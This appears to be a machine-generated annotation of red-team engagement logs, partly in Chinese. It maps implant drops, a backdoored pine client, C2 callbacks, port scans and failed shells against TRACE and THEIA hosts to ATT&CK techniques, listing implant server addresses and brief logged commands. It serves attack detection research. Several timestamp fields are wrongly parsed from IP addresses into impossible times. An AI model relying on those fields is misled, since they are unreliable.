- `domain` / `drakon.linux`  Evidence: `3_15_e018, 3_15_e021`  Raw: drakon.linux
- `ip_port` / `5.214.163.155:80`  Evidence: `3_15_e019`  Raw: 5.214.163.155:80
- `ip_port` / `128.55.12.167:8014`  Evidence: `3_15_e019`  Raw: 128.55.12.167:8014
- `ip_port` / `45.26.25.240:80`  Evidence: `3_15_e020`  Raw: 45.26.25.240:80
- `ip_port` / `128.55.12.167:8015`  Evidence: `3_15_e020`  Raw: 128.55.12.167:8015
- `ip_port` / `161.116.88.72:80`  Evidence: `3_15_e021`  Raw: 161.116.88.72:80
- `ip_port` / `128.55.12.167:8016`  Evidence: `3_15_e021`  Raw: 128.55.12.167:8016
- `host` / `THEIA`  Evidence: `3_15_e021, 3_15_e022, 3_15_e023, 3_15_e024, 3_15_e025, 3_15_e030`  Raw: THEIA
- `ip_port` / `146.153.68.151:80`  Evidence: `3_15_e022`  Raw: 146.153.68.151:80
- `ip_port` / `128.55.12.167:8017`  Evidence: `3_15_e022`  Raw: 128.55.12.167:8017
- `ip_port` / `104.228.117.212:80`  Evidence: `3_15_e023`  Raw: 104.228.117.212:80
- `ip_port` / `128.55.12.167:8018`  Evidence: `3_15_e023`  Raw: 128.55.12.167:8018
- `ip_port` / `141.43.176.203:80`  Evidence: `3_15_e024`  Raw: 141.43.176.203:80
- `ip_port` / `128.55.12.167:8019`  Evidence: `3_15_e024`  Raw: 128.55.12.167:8019
- `ip_port` / `149.52.198.23:80`  Evidence: `3_15_e025`  Raw: 149.52.198.23:80
- `ip_port` / `128.55.12.167:8060`  Evidence: `3_15_e025`  Raw: 128.55.12.167:8060
- `ip_port` / `162.66.239.75:80`  Evidence: `3_15_e026`  Raw: 162.66.239.75:80
- `ip_port` / `128.55.12.167:8061`  Evidence: `3_15_e026`  Raw: 128.55.12.167:8061
- `ip_port` / `17.146.0.252:80`  Evidence: `3_15_e027`  Raw: 17.146.0.252:80
- `ip_port` / `128.55.12.167:8064`  Evidence: `3_15_e027`  Raw: 128.55.12.167:8064
- `host` / `CADETS`  Evidence: `3_15_e030`  Raw: CADETS
- `host` / `FIVEDIRECTIONS`  Evidence: `3_15_e030`  Raw: FiveDirections

#### 原始子节摘录

- `3.15.lead` Section Lead (lines 1178-1186)

  > Continued attack against TRACE by exploiting the target via the malicious pass manager browser
  > extension in Firefox 54.0.1. The attacker had previously tried to load drakon into the memory of the
  > browser extension on Windows, but this was unsuccessful. So, the attacker resorted to writing the
  > drakon implant executable to disk on the target upon exploiting the browser extension. While noisier
  > than the originally planned attack, this achieved the same purpose. The attacker was able to run micro
  > apt from the target disk. Micro apt connected out to the micro C2 listener. The attacker then used
  > micro apt to perform a portscan of the known hosts on the target network; however, the portscan
  > found no open ports when run from the TRACE host.

- `3.15.1` Comments (lines 1188-1202)

  > The goal of this attack was to resume the prior attack by injecting the file that was previously dropped to
  > disk into the sshd process. From there, the hosts on the target network would be portscanned using the
  > micro apt implant.
  > The plan did not work as expected because of process injection failing. We used the browser extension
  > to write the drakon implant executable to disk. It connected back, and we now had an open connection
  > to the TRACE host from executed from disk with standard user privileges. We tried to load the file
  > staged on disk into sshd process memory but could not do so due to issues we were having with process
  > injection on the target machines during the engagement. We settled for writing micro apt to disk and
  > executing it. We were unable to elevate micro because after the TRACE host was rebooted the day
  > before we did not get a chance to reinstall the elevate driver. The lack of root privileges might be why
  > the portscan did not work as expected, but we need to test to root cause the issue.

- `3.15.2` Event Log (lines 1203-1216)

  > - 1243 browse to allstate.com
  > - 1243 shell L1
  > - 1243 ps
  > - * 1810      1    root (sshd)
  > - 1246 ztmp
  > - 1246 elevate ztmp
  > - 1247 execfile
  > - 1248 micro callback
  > - 1248 micro portscan
  > - 1251 rm /tmp/ztmp
  > - 1253 netrecon 8064

- `3.15.3` Addresses (lines 1217-1233)

  > - [eth0:890] 145.199.103.57:80 -> 128.55.12.167:8010 TRACE webserver
  > - [eth0:891] 61.130.69.232:80 -> 128.55.12.167:8011    TRACE shellcode_server
  > - [eth0:892] 2.233.33.52:80 -> 128.55.12.167:8012    TRACE loaderDrakon.linux.x64
  > - [eth0:893] 180.156.107.146:80 -> 128.55.12.167:8013 TRACE drakon.linux.x64
  > - [eth0:894] 5.214.163.155:80 -> 128.55.12.167:8014    TRACE libdrakon.linux.x64.so
  > - [eth0:895] 45.26.25.240:80 -> 128.55.12.167:8015    TRACE netrecon
  > - [eth0:896] 161.116.88.72:80 -> 128.55.12.167:8016    THEIA drakon.linux.x64
  > - [eth0:897] 146.153.68.151:80 -> 128.55.12.167:8017 THEIA loaderDrakon.linux.x64
  > - [eth0:898] 104.228.117.212:80 -> 128.55.12.167:8018 THEIA webserver
  > - [eth0:899] 141.43.176.203:80 -> 128.55.12.167:8019 THEIA shellcode_server
  > - [eth0:950] 149.52.198.23:80 -> 128.55.12.167:8060   THEIA micro
  > - [eth0:951] 162.66.239.75:80 -> 128.55.12.167:8061   TRACE micro
  > - [eth0:954] 17.146.0.252:80 -> 128.55.12.167:8064   TRACE netrecon 2

- `3.15.4` Graph (lines 1234-1257)

  > ## 4 Common Threat
  > This section consists of details on the Nation State attacks. They are listed in the following table.
  > ```text
  >  Date             Time   Target            Tool          Description
  >  2018-04-06       1500   CADETS            E-mail        E-mail Server
  >  2018-04-06       1500   ClearScope        E-mail        Phishing E-mail Link
  >  2018-04-09       1400   TA5.2             Excel         Phishing E-mail with Malicious Excel Macro
  >  2018-04-09       1500   FiveDirections    Excel         Phishing E-mail with Malicious Excel Macro
  >  2018-04-10       1200   TRACE             E-mail        Phishing E-mail Link
  >  2018-04-10       1300   THEIA             E-mail        Phishing E-mail Link
  >  2018-04-10       1400   TA5.2             E-mail        Phishing E-mail Link
  >  2018-04-13       1400   THEIA             Executable    Phishing E-mail Executable
  >  2018-04-13       1400   TRACE             Executable    Phishing E-mail Executable
  >  2018-04-13       1500   FiveDirections    Executable    Phishing E-mail Executable
  >  2018-04-13       1500   TA5.2             Executable    Phishing E-mail Executable
  > ```

#### 证据条目

1. `3_15_e001` | `narrative_comment` | `3.15.lead Section Lead` | lines `1178-1186`
   - Raw: Continued attack against TRACE by exploiting the target via the malicious pass manager browser extension in Firefox 54.0.1. The attacker had previously tried to load drakon into the memory of the browser extension on Windows, but this was unsuccessful. So, the attacker resorted to writing the drakon implant executable to disk on the target upon exploiting the browser extension. While noisier than the originally planned attack, this achieved the same purpose. The attacker was able to run micro apt from the target disk. Micro apt connected out to the micro C2 listener. The attacker then used micro apt to perform a portscan of the known hosts on the target network; however, the portscan found no open ports when run from the TRACE host.
   - Time: `-` / `-`
   - Observables: process_name=firefox; process_name=drakon; process_name=micro; host=TRACE; email_artifact=micro apt; email_artifact=Micro apt
1. `3_15_e002` | `narrative_comment` | `3.15.1 Comments` | lines `1190-1192`
   - Raw: The goal of this attack was to resume the prior attack by injecting the file that was previously dropped to disk into the sshd process. From there, the hosts on the target network would be portscanned using the micro apt implant.
   - Time: `-` / `-`
   - Observables: process_name=sshd; process_name=micro; command=The goal of this attack was to resume the prior attack by injecting the file that was previously dropped to disk into the sshd process. From there, the hosts on the target network would be portscanned using the micro apt implant.; email_artifact=micro apt
1. `3_15_e003` | `narrative_comment` | `3.15.1 Comments` | lines `1194-1201`
   - Raw: The plan did not work as expected because of process injection failing. We used the browser extension to write the drakon implant executable to disk. It connected back, and we now had an open connection to the TRACE host from executed from disk with standard user privileges. We tried to load the file staged on disk into sshd process memory but could not do so due to issues we were having with process injection on the target machines during the engagement. We settled for writing micro apt to disk and executing it. We were unable to elevate micro because after the TRACE host was rebooted the day before we did not get a chance to reinstall the elevate driver. The lack of root privileges might be why the portscan did not work as expected, but we need to test to root cause the issue.
   - Time: `-` / `-`
   - Observables: process_name=sshd; process_name=drakon; process_name=micro; command=The plan did not work as expected because of process injection failing. We used the browser extension to write the drakon implant executable to disk. It connected back, and we now had an open connection to the TRACE host from executed from disk with standard user privileges. We tried to load the file staged on disk into sshd process memory but could not do so due to issues we were having with process injection on the target machines during the engagement. We settled for writing micro apt to disk and executing it. We were unable to elevate micro because after the TRACE host was rebooted the day before we did not get a chance to reinstall the elevate driver. The lack of root privileges might be why the portscan did not work as expected, but we need to test to root cause the issue.; host=TRACE; email_artifact=micro apt
1. `3_15_e004` | `event_log` | `3.15.2 Event Log` | lines `1205-1205`
   - Raw: 1243 browse to allstate.com
   - Time: `1243` / `2018-04-13T12:43:00`
   - Observables: domain=allstate.com
1. `3_15_e005` | `event_log` | `3.15.2 Event Log` | lines `1206-1206`
   - Raw: 1243 shell L1
   - Time: `1243` / `2018-04-13T12:43:00`
   - Observables: -
1. `3_15_e006` | `event_log` | `3.15.2 Event Log` | lines `1207-1207`
   - Raw: 1243 ps
   - Time: `1243` / `2018-04-13T12:43:00`
   - Observables: command=1243 ps
1. `3_15_e007` | `event_log` | `3.15.2 Event Log` | lines `1208-1208`
   - Raw: * 1810      1    root (sshd)
   - Time: `-` / `-`
   - Observables: process_name=sshd
1. `3_15_e008` | `event_log` | `3.15.2 Event Log` | lines `1209-1209`
   - Raw: 1246 ztmp
   - Time: `1246` / `2018-04-13T12:46:00`
   - Observables: -
1. `3_15_e009` | `event_log` | `3.15.2 Event Log` | lines `1210-1210`
   - Raw: 1246 elevate ztmp
   - Time: `1246` / `2018-04-13T12:46:00`
   - Observables: command=1246 elevate ztmp
1. `3_15_e010` | `event_log` | `3.15.2 Event Log` | lines `1211-1211`
   - Raw: 1247 execfile
   - Time: `1247` / `2018-04-13T12:47:00`
   - Observables: command=1247 execfile
1. `3_15_e011` | `event_log` | `3.15.2 Event Log` | lines `1212-1212`
   - Raw: 1248 micro callback
   - Time: `1248` / `2018-04-13T12:48:00`
   - Observables: process_name=micro
1. `3_15_e012` | `event_log` | `3.15.2 Event Log` | lines `1213-1213`
   - Raw: 1248 micro portscan
   - Time: `1248` / `2018-04-13T12:48:00`
   - Observables: process_name=micro
1. `3_15_e013` | `event_log` | `3.15.2 Event Log` | lines `1214-1214`
   - Raw: 1251 rm /tmp/ztmp
   - Time: `1251` / `2018-04-13T12:51:00`
   - Observables: file_path=/tmp/ztmp
1. `3_15_e014` | `event_log` | `3.15.2 Event Log` | lines `1215-1215`
   - Raw: 1253 netrecon 8064
   - Time: `1253` / `2018-04-13T12:53:00`
   - Observables: process_name=netrecon
1. `3_15_e015` | `address` | `3.15.3 Addresses` | lines `1219-1219`
   - Raw: [eth0:890] 145.199.103.57:80 -> 128.55.12.167:8010 TRACE webserver
   - Time: `57:80` / `2018-04-13T57:80:00`
   - Observables: ip_port=145.199.103.57:80; ip_port=128.55.12.167:8010; host=TRACE
1. `3_15_e016` | `address` | `3.15.3 Addresses` | lines `1220-1220`
   - Raw: [eth0:891] 61.130.69.232:80 -> 128.55.12.167:8011    TRACE shellcode_server
   - Time: `55.12` / `2018-04-13T55:12:00`
   - Observables: ip_port=61.130.69.232:80; ip_port=128.55.12.167:8011; host=TRACE
1. `3_15_e017` | `address` | `3.15.3 Addresses` | lines `1221-1221`
   - Raw: [eth0:892] 2.233.33.52:80 -> 128.55.12.167:8012    TRACE loaderDrakon.linux.x64
   - Time: `33.52` / `2018-04-13T33:52:00`
   - Observables: ip_port=2.233.33.52:80; ip_port=128.55.12.167:8012; domain=loaderDrakon.linux; process_name=drakon; process_name=loaderdrakon; host=TRACE
1. `3_15_e018` | `address` | `3.15.3 Addresses` | lines `1222-1222`
   - Raw: [eth0:893] 180.156.107.146:80 -> 128.55.12.167:8013 TRACE drakon.linux.x64
   - Time: `55.12` / `2018-04-13T55:12:00`
   - Observables: ip_port=180.156.107.146:80; ip_port=128.55.12.167:8013; domain=drakon.linux; process_name=drakon; host=TRACE
1. `3_15_e019` | `address` | `3.15.3 Addresses` | lines `1223-1223`
   - Raw: [eth0:894] 5.214.163.155:80 -> 128.55.12.167:8014    TRACE libdrakon.linux.x64.so
   - Time: `55.12` / `2018-04-13T55:12:00`
   - Observables: ip_port=5.214.163.155:80; ip_port=128.55.12.167:8014; process_name=drakon; host=TRACE
1. `3_15_e020` | `address` | `3.15.3 Addresses` | lines `1224-1224`
   - Raw: [eth0:895] 45.26.25.240:80 -> 128.55.12.167:8015    TRACE netrecon
   - Time: `45.26` / `2018-04-13T45:26:00`
   - Observables: ip_port=45.26.25.240:80; ip_port=128.55.12.167:8015; process_name=netrecon; host=TRACE
1. `3_15_e021` | `address` | `3.15.3 Addresses` | lines `1225-1225`
   - Raw: [eth0:896] 161.116.88.72:80 -> 128.55.12.167:8016    THEIA drakon.linux.x64
   - Time: `88.72` / `2018-04-13T88:72:00`
   - Observables: ip_port=161.116.88.72:80; ip_port=128.55.12.167:8016; domain=drakon.linux; process_name=drakon; host=THEIA
1. `3_15_e022` | `address` | `3.15.3 Addresses` | lines `1226-1226`
   - Raw: [eth0:897] 146.153.68.151:80 -> 128.55.12.167:8017 THEIA loaderDrakon.linux.x64
   - Time: `55.12` / `2018-04-13T55:12:00`
   - Observables: ip_port=146.153.68.151:80; ip_port=128.55.12.167:8017; domain=loaderDrakon.linux; process_name=drakon; process_name=loaderdrakon; host=THEIA
1. `3_15_e023` | `address` | `3.15.3 Addresses` | lines `1227-1227`
   - Raw: [eth0:898] 104.228.117.212:80 -> 128.55.12.167:8018 THEIA webserver
   - Time: `55.12` / `2018-04-13T55:12:00`
   - Observables: ip_port=104.228.117.212:80; ip_port=128.55.12.167:8018; host=THEIA
1. `3_15_e024` | `address` | `3.15.3 Addresses` | lines `1229-1229`
   - Raw: [eth0:899] 141.43.176.203:80 -> 128.55.12.167:8019 THEIA shellcode_server
   - Time: `55.12` / `2018-04-13T55:12:00`
   - Observables: ip_port=141.43.176.203:80; ip_port=128.55.12.167:8019; host=THEIA
1. `3_15_e025` | `address` | `3.15.3 Addresses` | lines `1230-1230`
   - Raw: [eth0:950] 149.52.198.23:80 -> 128.55.12.167:8060   THEIA micro
   - Time: `23:80` / `2018-04-13T23:80:00`
   - Observables: ip_port=149.52.198.23:80; ip_port=128.55.12.167:8060; process_name=micro; host=THEIA
1. `3_15_e026` | `address` | `3.15.3 Addresses` | lines `1231-1231`
   - Raw: [eth0:951] 162.66.239.75:80 -> 128.55.12.167:8061   TRACE micro
   - Time: `75:80` / `2018-04-13T75:80:00`
   - Observables: ip_port=162.66.239.75:80; ip_port=128.55.12.167:8061; process_name=micro; host=TRACE
1. `3_15_e027` | `address` | `3.15.3 Addresses` | lines `1232-1232`
   - Raw: [eth0:954] 17.146.0.252:80 -> 128.55.12.167:8064   TRACE netrecon 2
   - Time: `55.12` / `2018-04-13T55:12:00`
   - Observables: ip_port=17.146.0.252:80; ip_port=128.55.12.167:8064; process_name=netrecon; host=TRACE
1. `3_15_e028` | `narrative_comment` | `3.15.4 Graph` | lines `1238-1238`
   - Raw: ## 4 Common Threat
   - Time: `-` / `-`
   - Observables: -
1. `3_15_e029` | `narrative_comment` | `3.15.4 Graph` | lines `1240-1240`
   - Raw: This section consists of details on the Nation State attacks. They are listed in the following table.
   - Time: `-` / `-`
   - Observables: -
1. `3_15_e030` | `narrative_comment` | `3.15.4 Graph` | lines `1243-1256`
   - Raw: ```text Date             Time   Target            Tool          Description 2018-04-06       1500   CADETS            E-mail        E-mail Server 2018-04-06       1500   ClearScope        E-mail        Phishing E-mail Link 2018-04-09       1400   TA5.2             Excel         Phishing E-mail with Malicious Excel Macro 2018-04-09       1500   FiveDirections    Excel         Phishing E-mail with Malicious Excel Macro 2018-04-10       1200   TRACE             E-mail        Phishing E-mail Link 2018-04-10       1300   THEIA             E-mail        Phishing E-mail Link 2018-04-10       1400   TA5.2             E-mail        Phishing E-mail Link 2018-04-13       1400   THEIA             Executable    Phishing E-mail Executable 2018-04-13       1400   TRACE             Executable    Phishing E-mail Executable 2018-04-13       1500   FiveDirections    Executable    Phishing E-mail Executable 2018-04-13       1500   TA5.2             Executable    Phishing E-mail Executable ```
   - Time: `-` / `-`
   - Observables: host=CADETS; host=TRACE; host=THEIA; host=FIVEDIRECTIONS

### TRACE_20180413_1350_1428_05 / Section 4.9

- 标题：`20180413 1400 TRACE – Phishing E-mail w/ Executable Attachment`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-13T13:50:00` -> `2018-04-13T14:28:00`
- Markdown 行号：`1655-1720`
- 报告页：`40, 41`
- 攻击概述：TRACE 上的第一封恶意 tcexec 附件邮件失败，第二封把 micro apt 伪装成 tcexec 后成功：用户打开邮件后 micro 自动执行并回连，随后进行端口扫描，shell 命令尝试失败。
- 备注：窗口同时保留 first attachment failed 与 second micro succeeded 两段，但 confirmed tactics 只按成功的 micro 链判定。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | 恶意可执行附件被送达并在第二轮形成真正的自动执行入口。 | 4_9_e004, 4_9_e011, 4_9_e012 |
| EXECUTION | confirmed | 执行 | micro apt 作为附件被自动执行为新进程。 | 4_9_e023, 4_9_e024, 4_9_e025, 4_9_e013 |
| COMMAND_AND_CONTROL | confirmed | 命令控制 | Micro APT C2 连接被直接记录。 | 4_9_e001, 4_9_e013, 4_9_e019, 4_9_e026 |
| DISCOVERY | confirmed | 侦察发现 | micro apt 对目标网络主机发起端口扫描。 | 4_9_e001, 4_9_e014 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1566.001 | confirmed | 报告明确写到通过恶意可执行附件发送 tcexec/micro。 | 4_9_e004, 4_9_e011, 4_9_e012 |
| T1204.002 | confirmed | 用户打开邮件后附件被执行。 | 4_9_e004, 4_9_e011, 4_9_e012, 4_9_e013 |
| T1071.001 | confirmed | Micro APT listener/C2 通过 web 风格地址建立。 | 4_9_e001, 4_9_e013, 4_9_e019, 4_9_e026 |
| T1046 | confirmed | portscan 明确对应网络服务侦察。 | 4_9_e001, 4_9_e014 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| phishing_attachment | attachment_open | confirmed | 两次邮件附件投递都在 Event Log 中有直接记录，第二次 micro-as-tcexec 成功形成自动执行链。 | 4_9_e004, 4_9_e011, 4_9_e012 |
| payload_write | payload_write | confirmed | tcexec、tcexfil、Micro APT 文件都落到了磁盘。 | 4_9_e023, 4_9_e024, 4_9_e025 |
| payload_execute | payload_execute | confirmed | 第二次邮件打开后 micro apt 自动执行成新进程。 | 4_9_e013 |
| c2_callback | c2_callback | confirmed | Micro APT C2 与 eth0:951 TRACE micro 地址共同支撑控制连接。 | 4_9_e001, 4_9_e013, 4_9_e019, 4_9_e026 |
| network_scan | scan | confirmed | Event Log 中有 micro apt portscan。 | 4_9_e001, 4_9_e014 |
| shell_attempt | shell_attempt | attempted | micro apt shell cmd try 1/2/3 均失败。 | 4_9_e015, 4_9_e016, 4_9_e017 |

#### 显式观测

- `process_name` / `micro`  Evidence: `4_9_e001, 4_9_e002, 4_9_e003, 4_9_e011, 4_9_e013, 4_9_e014, 4_9_e015, 4_9_e016, 4_9_e017, 4_9_e018, 4_9_e019, 4_9_e025, 4_9_e026`  Raw: micro
- `process_name` / `pine`  Evidence: `4_9_e001, 4_9_e002, 4_9_e005, 4_9_e010`  Raw: pine
- `host` / `TRACE`  Evidence: `4_9_e001, 4_9_e002, 4_9_e019`  Raw: TRACE
- `email_artifact` / `micro apt`  Evidence: `4_9_e001, 4_9_e002, 4_9_e003, 4_9_e013, 4_9_e014, 4_9_e015, 4_9_e016, 4_9_e017, 4_9_e018`  Raw: micro apt
- `email_artifact` / `tcexec`  Evidence: `4_9_e004, 4_9_e005, 4_9_e007, 4_9_e011, 4_9_e023`  Raw: tcexec
- `ip_port` / `03.12.253.24:80`  Evidence: `4_9_e015`  Raw: 03.12.253.24:80
- `ip_port` / `207.103.191.4:80`  Evidence: `4_9_e016, 4_9_e017, 4_9_e021, 4_9_e022`  Raw: 207.103.191.4:80
- `ip_port` / `162.66.239.75:80`  Evidence: `4_9_e019`  Raw: 162.66.239.75:80
- `ip_port` / `128.55.12.167:8061`  Evidence: `4_9_e019`  Raw: 128.55.12.167:8061
- `ip_port` / `103.12.253.24:80`  Evidence: `4_9_e020`  Raw: 103.12.253.24:80
- `ip_port` / `128.55.12.167:8065`  Evidence: `4_9_e020`  Raw: 128.55.12.167:8065
- `ip_port` / `128.55.12.167:8069`  Evidence: `4_9_e021, 4_9_e022`  Raw: 128.55.12.167:8069
- `email_artifact` / `Micro APT`  Evidence: `4_9_e025, 4_9_e026`  Raw: Micro APT

#### 原始子节摘录

- `4.9.lead` Section Lead (lines 1657-1662)

  > The attacker ran a different kind of attack against TRACE. The attacker sent a malicious executable as an
  > e-mail attachment to the target that exploits a vulnerability in pine. The exploit did not work as
  > expected, but the user opened and file and ran it anyway. The attack did not work as expected, so the
  > attacker tried sending another e-mail, this time with micro apt. This attempt worked and resulted in a
  > new micro apt process running on target with a connection out to the micro apt listener. The attacker
  > ran a portscan of the target network hosts. The attacker also tried to open a shell process but failed.

- `4.9.1` Comments (lines 1664-1679)

  > This attack was designed specifically for TRACE due to their previously stated work on defending the
  > pine e-mail client. We installed a vulnerable pine e-mail client that would do two things: 1) write stolen
  > e-mail data to a file called tcexcil, and 2) automatically run specific e-mail attachments when the e-mail
  > is opened. The first e-mail attachment we sent failed to run. We discovered this happened because our
  > version of pine was no longer running due to a system restart, and the original version was running
  > instead. We also discovered that the executable we had sent would not run as expected on the target.
  > We learned the night before that QT was required, and we installed it since we could not get it to
  > statically link during the engagement. Once our vulnerable pine client was running, we tried again but
  > this time with the micro apt implant. When the user opened the e-mail, micro apt automatically
  > executed as a new process and connected back to the listener for C2. Finally, we were unable to start a
  > new shell process using micro apt on the target, but we suspect this has more to do with our ssh
  > tunneling than with micro apt.

- `4.9.2` Event Log (lines 1680-1697)

  > - 13:50 from bob to everyone tcexec (malicious executable)
  > - 13:50 Pine backdoor tcexec
  > - 13:50 Did the attachment run automatically? No.
  > - 14:02 Manual download tcexec to desktop
  > - 14:02 ran it
  > - 14:02 failed missing library
  > - 14:10 found that our vulnerable pine client wasn't running on the target, started it
  > - 14:15 sent micro as tcexec (port 8061)
  > - 14:20 open email with attachment
  > - 14:20 got connection micro apt
  > - 14:22 portscan from micro apt
  > - 14:25 micro apt shell cmd try 1: 03.12.253.24:80, fail
  > - 14:28 micro apt shell cmd try 2: 207.103.191.4:80, fail
  > - 14:28 micro apt shell cmd try 3: 207.103.191.4:80, fail
  > - 14:28 micro apt quit

- `4.9.3` Addresses (lines 1698-1704)

  > - [eth0:951] 162.66.239.75:80 -> 128.55.12.167:8061 TRACE micro
  > - [eth0:955] 103.12.253.24:80 -> 128.55.12.167:8065 shell try
  > - [eth0:959] 207.103.191.4:80 -> 128.55.12.167:8069 shell try 2
  > - [eth0:959] 207.103.191.4:80 -> 128.55.12.167:8069 shell try 2

- `4.9.4` Interactions (lines 1705-1706)
- `4.9.4.1` Files (lines 1707-1712)

  > - tcexec file downloaded to disk
  > - tcexfil file written to tmp directory
  > - Micro APT File downloaded to disk

- `4.9.4.2` Connections (lines 1713-1716)

  > - Micro APT C2

- `4.9.5` Graph (lines 1717-1720)
#### 证据条目

1. `4_9_e001` | `narrative_comment` | `4.9.lead Section Lead` | lines `1657-1662`
   - Raw: The attacker ran a different kind of attack against TRACE. The attacker sent a malicious executable as an e-mail attachment to the target that exploits a vulnerability in pine. The exploit did not work as expected, but the user opened and file and ran it anyway. The attack did not work as expected, so the attacker tried sending another e-mail, this time with micro apt. This attempt worked and resulted in a new micro apt process running on target with a connection out to the micro apt listener. The attacker ran a portscan of the target network hosts. The attacker also tried to open a shell process but failed.
   - Time: `-` / `-`
   - Observables: process_name=micro; process_name=pine; host=TRACE; email_artifact=micro apt
1. `4_9_e002` | `narrative_comment` | `4.9.1 Comments` | lines `1666-1674`
   - Raw: This attack was designed specifically for TRACE due to their previously stated work on defending the pine e-mail client. We installed a vulnerable pine e-mail client that would do two things: 1) write stolen e-mail data to a file called tcexcil, and 2) automatically run specific e-mail attachments when the e-mail is opened. The first e-mail attachment we sent failed to run. We discovered this happened because our version of pine was no longer running due to a system restart, and the original version was running instead. We also discovered that the executable we had sent would not run as expected on the target. We learned the night before that QT was required, and we installed it since we could not get it to statically link during the engagement. Once our vulnerable pine client was running, we tried again but this time with the micro apt implant. When the user opened the e-mail, micro apt automatically
   - Time: `-` / `-`
   - Observables: process_name=micro; process_name=pine; host=TRACE; email_artifact=micro apt
1. `4_9_e003` | `narrative_comment` | `4.9.1 Comments` | lines `1676-1678`
   - Raw: executed as a new process and connected back to the listener for C2. Finally, we were unable to start a new shell process using micro apt on the target, but we suspect this has more to do with our ssh tunneling than with micro apt.
   - Time: `-` / `-`
   - Observables: process_name=micro; email_artifact=micro apt
1. `4_9_e004` | `event_log` | `4.9.2 Event Log` | lines `1682-1682`
   - Raw: 13:50 from bob to everyone tcexec (malicious executable)
   - Time: `13:50` / `2018-04-13T13:50:00`
   - Observables: email_artifact=tcexec
1. `4_9_e005` | `event_log` | `4.9.2 Event Log` | lines `1683-1683`
   - Raw: 13:50 Pine backdoor tcexec
   - Time: `13:50` / `2018-04-13T13:50:00`
   - Observables: process_name=pine; email_artifact=tcexec
1. `4_9_e006` | `event_log` | `4.9.2 Event Log` | lines `1684-1684`
   - Raw: 13:50 Did the attachment run automatically? No.
   - Time: `13:50` / `2018-04-13T13:50:00`
   - Observables: -
1. `4_9_e007` | `event_log` | `4.9.2 Event Log` | lines `1685-1685`
   - Raw: 14:02 Manual download tcexec to desktop
   - Time: `14:02` / `2018-04-13T14:02:00`
   - Observables: email_artifact=tcexec
1. `4_9_e008` | `event_log` | `4.9.2 Event Log` | lines `1686-1686`
   - Raw: 14:02 ran it
   - Time: `14:02` / `2018-04-13T14:02:00`
   - Observables: -
1. `4_9_e009` | `event_log` | `4.9.2 Event Log` | lines `1687-1687`
   - Raw: 14:02 failed missing library
   - Time: `14:02` / `2018-04-13T14:02:00`
   - Observables: -
1. `4_9_e010` | `event_log` | `4.9.2 Event Log` | lines `1688-1688`
   - Raw: 14:10 found that our vulnerable pine client wasn't running on the target, started it
   - Time: `14:10` / `2018-04-13T14:10:00`
   - Observables: process_name=pine
1. `4_9_e011` | `event_log` | `4.9.2 Event Log` | lines `1689-1689`
   - Raw: 14:15 sent micro as tcexec (port 8061)
   - Time: `14:15` / `2018-04-13T14:15:00`
   - Observables: process_name=micro; email_artifact=tcexec
1. `4_9_e012` | `event_log` | `4.9.2 Event Log` | lines `1690-1690`
   - Raw: 14:20 open email with attachment
   - Time: `14:20` / `2018-04-13T14:20:00`
   - Observables: -
1. `4_9_e013` | `event_log` | `4.9.2 Event Log` | lines `1691-1691`
   - Raw: 14:20 got connection micro apt
   - Time: `14:20` / `2018-04-13T14:20:00`
   - Observables: process_name=micro; email_artifact=micro apt
1. `4_9_e014` | `event_log` | `4.9.2 Event Log` | lines `1692-1692`
   - Raw: 14:22 portscan from micro apt
   - Time: `14:22` / `2018-04-13T14:22:00`
   - Observables: process_name=micro; email_artifact=micro apt
1. `4_9_e015` | `event_log` | `4.9.2 Event Log` | lines `1693-1693`
   - Raw: 14:25 micro apt shell cmd try 1: 03.12.253.24:80, fail
   - Time: `14:25` / `2018-04-13T14:25:00`
   - Observables: ip_port=03.12.253.24:80; process_name=micro; email_artifact=micro apt
1. `4_9_e016` | `event_log` | `4.9.2 Event Log` | lines `1694-1694`
   - Raw: 14:28 micro apt shell cmd try 2: 207.103.191.4:80, fail
   - Time: `14:28` / `2018-04-13T14:28:00`
   - Observables: ip_port=207.103.191.4:80; process_name=micro; email_artifact=micro apt
1. `4_9_e017` | `event_log` | `4.9.2 Event Log` | lines `1695-1695`
   - Raw: 14:28 micro apt shell cmd try 3: 207.103.191.4:80, fail
   - Time: `14:28` / `2018-04-13T14:28:00`
   - Observables: ip_port=207.103.191.4:80; process_name=micro; email_artifact=micro apt
1. `4_9_e018` | `event_log` | `4.9.2 Event Log` | lines `1696-1696`
   - Raw: 14:28 micro apt quit
   - Time: `14:28` / `2018-04-13T14:28:00`
   - Observables: process_name=micro; email_artifact=micro apt
1. `4_9_e019` | `address` | `4.9.3 Addresses` | lines `1700-1700`
   - Raw: [eth0:951] 162.66.239.75:80 -> 128.55.12.167:8061 TRACE micro
   - Time: `75:80` / `2018-04-13T75:80:00`
   - Observables: ip_port=162.66.239.75:80; ip_port=128.55.12.167:8061; process_name=micro; host=TRACE
1. `4_9_e020` | `address` | `4.9.3 Addresses` | lines `1701-1701`
   - Raw: [eth0:955] 103.12.253.24:80 -> 128.55.12.167:8065 shell try
   - Time: `24:80` / `2018-04-13T24:80:00`
   - Observables: ip_port=103.12.253.24:80; ip_port=128.55.12.167:8065
1. `4_9_e021` | `address` | `4.9.3 Addresses` | lines `1702-1702`
   - Raw: [eth0:959] 207.103.191.4:80 -> 128.55.12.167:8069 shell try 2
   - Time: `4:80` / `2018-04-13T04:80:00`
   - Observables: ip_port=207.103.191.4:80; ip_port=128.55.12.167:8069
1. `4_9_e022` | `address` | `4.9.3 Addresses` | lines `1703-1703`
   - Raw: [eth0:959] 207.103.191.4:80 -> 128.55.12.167:8069 shell try 2
   - Time: `4:80` / `2018-04-13T04:80:00`
   - Observables: ip_port=207.103.191.4:80; ip_port=128.55.12.167:8069
1. `4_9_e023` | `interaction_file` | `4.9.4.1 Files` | lines `1709-1709`
   - Raw: tcexec file downloaded to disk
   - Time: `-` / `-`
   - Observables: email_artifact=tcexec
1. `4_9_e024` | `interaction_file` | `4.9.4.1 Files` | lines `1710-1710`
   - Raw: tcexfil file written to tmp directory
   - Time: `-` / `-`
   - Observables: -
1. `4_9_e025` | `interaction_file` | `4.9.4.1 Files` | lines `1711-1711`
